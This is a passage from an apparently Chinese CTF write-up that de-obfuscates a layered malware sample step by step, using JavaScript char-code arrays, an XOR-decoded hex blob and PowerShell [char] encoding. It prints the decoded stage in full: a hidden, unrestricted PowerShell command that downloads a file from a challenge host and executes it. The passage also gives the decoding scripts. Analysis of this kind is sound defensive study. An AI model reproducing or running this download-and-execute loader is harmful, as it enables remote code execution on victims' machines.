class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">658</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">658</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">650</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">640</span>, <span class="number">645</span>, <span class="number">640</span>, <span class="number">647</span>, <span class="number">724</span>, <span class="number">651</span>, <span class="number">726</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">725</span>, <span class="number">633</span>, <span class="number">638</span>, <span class="number">633</span>, <span class="number">724</span>, <span class="number">633</span>, <span class="number">692</span>, <span class="number">700</span>, <span class="number">705</span>, <span class="number">698</span>, <span class="number">715</span>, <span class="number">694</span>, <span class="number">641</span>, <span class="number">692</span>, <span class="number">668</span>, <span class="number">712</span>, <span class="number">711</span>, <span class="number">719</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">717</span>, <span class="number">694</span>, <span class="number">659</span>, <span class="number">659</span>, <span class="number">685</span>, <span class="number">712</span>, <span class="number">667</span>, <span class="number">722</span>, <span class="number">717</span>, <span class="number">702</span>, <span class="number">641</span>, <span class="number">637</span>, <span class="number">696</span>, <span class="number">647</span>, <span class="number">687</span>, <span class="number">698</span>, <span class="number">709</span>, <span class="number">718</span>, <span class="number">702</span>, <span class="number">645</span>, <span class="number">650</span>, <span class="number">655</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">699</span>, <span class="number">721</span>, <span class="number">712</span>, <span class="number">715</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">651</span>, <span class="number">649</span>, <span class="number">653</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">726</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">707</span>, <span class="number">712</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">640</span>, <span class="number">660</span>, <span class="number">639</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">649</span>, <span class="number">645</span>, <span class="number">652</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">652</span>, <span class="number">642</span>];
+
+<span class="keyword">const</span> cmdStr = cmdArr.<span class="title function_">map</span>(<span class="function"><span class="params">n</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(n - <span class="number">601</span>)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(cmdStr);
+
+<span class="keyword">const</span> axArr = [<span class="number">688</span>,<span class="number">684</span>,<span class="number">700</span>,<span class="number">715</span>,<span class="number">706</span>,<span class="number">713</span>,<span class="number">717</span>,<span class="number">647</span>,<span class="number">684</span>,<span class="number">705</span>,<span class="number">702</span>,<span class="number">709</span>,<span class="number">709</span>];
+<span class="keyword">const</span> axStr  = axArr.<span class="title function_">map</span>(<span class="function"><span class="params">n</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(n - <span class="number">601</span>)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(axStr);</code></pre>
+
+<p>将得到的输出结果继续解密</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816173529743.png" alt="image-20250816173529743"></p>
+<p>这里应该是两两分割生成一个十六进制的文件，附带一个xor，按照这个逻辑生成解密脚本</p>
+<pre><code class="highlight python">hex_string = <span class="string">&quot;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6fffdf4ffffe3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7&quot;</span>
+
+key = <span class="number">204</span>
+
+decoded_chars = []
+
+<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>):
+    chunk = hex_string[i:i+<span class="number">2</span>]
+    byte_value = <span class="built_in">int</span>(chunk, <span class="number">16</span>)
+    decoded_byte = byte_value ^ key
+    decoded_chars.append(<span class="built_in">chr</span>(decoded_byte))
+
+decoded_script = <span class="string">&quot;&quot;</span>.join(decoded_chars)
+<span class="built_in">print</span>(decoded_script)</code></pre>
+
+<p>得到恶意脚本</p>
+<pre><code class="highlight powershell"><span class="built_in">iex</span><span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-ArgumentList</span> <span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;-ep&#x27;</span>,<span class="string">&#x27;Unrestricted&#x27;</span>,<span class="string">&#x27;-Command&#x27;</span>,<span class="string">&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:31833/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;</code></pre>
+
+<p>发现又下载了bestudding.jpg，我们去看下这个文件</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816173859191.png" alt="image-20250816173859191"></p>
+<p>把调用字符串转换成输出字符串</p>
+<pre><code class="highlight powershell"><span class="variable">$raw</span> = <span class="built_in">Get-Content</span> .\obf.ps1 <span class="literal">-Raw</span>
+<span class="variable">$fixed</span> = <span class="variable">$raw</span> <span class="operator">-replace</span> <span class="string">&#x27;\|\s*\.\s*\$r&#x27;</span>, <span class="string">&#x27;| Write-Output&#x27;</span>
+<span class="variable">$fixed</span> = <span class="variable">$fixed</span> <span class="operator">-replace</span> <span class="string">&#x27;\bI(E|e)X\b&#x27;</span>, <span class="string">&#x27;Write-Output&#x27;</span>
+<span class="variable">$fixed</span> = <span class="variable">$fixed</span> <span class="operator">-replace</span> <span class="string">&#x27;\bInvoke-Expression\b&#x27;</span>, <span class="string">&#x27;Write-Output&#x27;</span>
+<span class="built_in">Set-Content</span> <span class="literal">-Path</span> .\obf_fixed.ps1 <span class="literal">-Value</span> <span class="variable">$fixed</span> <span class="literal">-Encoding</span> UTF8
+.\obf_fixed.ps1 &gt; decoded.txt
+<span class="built_in">Get-Content</span> .\decoded.txt <span class="literal">-Raw</span></code></pre>
+
+<p>得到解密文本</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816174431660.png" alt=" "></p>
+<p>显而易见，这里是ASCII码， 继续生成解密脚本</p>
+<pre><code class="highlight python"><span class="keyword">import</span> re
+
+<span class="keyword">def</span> <span class="title function_">decode_ps_char_obfuscation</span>(<span class="params">obfuscated_code</span>):
+    <span class="string">&quot;&quot;&quot;</span>
+<span class="string">    解码形如 iex ([CHar]36+[CHar]68+...) 的 PowerShell 混淆代码。</span>
+<span class="string">    </span>
+<span class="string">    参数:</span>
+<span class="string">    obfuscated_code (str): 包含混淆代码的完整字符串。</span>
+<span class="string">    </span>
+<span class="string">    返回:</span>
+<span class="string">    str: 解码后的可读 PowerShell 脚本。</span>
+<span class="string">    &quot;&quot;&quot;</span>
+    
+    <span class="built_in">print</span>(<span class="string">&quot;--- 开始解码 ---&quot;</span>)
+    
+    <span class="comment"># 步骤 1: 定义正则表达式，用于匹配并提取 [CHar]... 括号中的所有数字</span>
+    <span class="comment"># r&#x27;\[CHar\](\d+)&#x27; 的意思是：</span>
+    <span class="comment"># \[CHar\]: 匹配字面上的 &quot;[CHar]&quot;。方括号需要用反斜杠 \ 转义。</span>
+    <span class="comment"># (\d+)    : 匹配一个或多个数字 (\d+)，并将其作为一个捕获组 (括号)。</span>
+    pattern = <span class="string">r&#x27;\[CHar\](\d+)&#x27;</span>
+    
+    <span class="comment"># 使用 re.findall 查找所有匹配项，并返回所有捕获组（也就是所有数字）的列表</span>
+    numbers = re.findall(pattern, obfuscated_code)
+    
+    <span class="keyword">if</span> <span class="keyword">not</span> numbers:
+        <span class="built_in">print</span>(<span class="string">&quot;未找到 [CHar] 格式的编码。请检查输入。&quot;</span>)
+        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>
+        
+    <span class="built_in">print</span>(<span class="string">f&quot;成功提取到 <span class="subst">&#123;<span class="built_in">len</span>(numbers)&#125;</span> 个字符编码。&quot;</span>)
+    
+    <span class="comment"># 步骤 2: 将数字列表中的每个数字（它们现在是字符串）转换为整数，然后再转换为字符</span>
